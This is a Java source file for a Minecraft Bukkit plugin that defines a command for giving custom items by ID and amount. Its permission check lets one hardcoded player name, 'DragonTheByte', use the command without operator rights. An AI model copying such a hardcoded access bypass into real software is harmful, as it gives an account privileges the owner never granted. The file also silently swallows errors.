package com.corruptedbyte.netherrpg.commands;

import com.corruptedbyte.netherrpg.managers.ItemDataBase;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

public class CustomGiveCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        // try {
        if (!sender.isOp()) {
            if (!sender.getName().equals("DragonTheByte")) {
                sender.sendMessage(ChatColor.RED + "Not enough right to use this command!");
                return true;
            }
        }
        try {
            ItemStack i = ItemDataBase.items.get(Integer.parseInt(args[0])).itemStack;
            i.setAmount(Integer.parseInt(args[1]));
            ((Player) sender).getInventory().addItem(i);
        } catch (Exception ignored) {}
        return true;
    }
}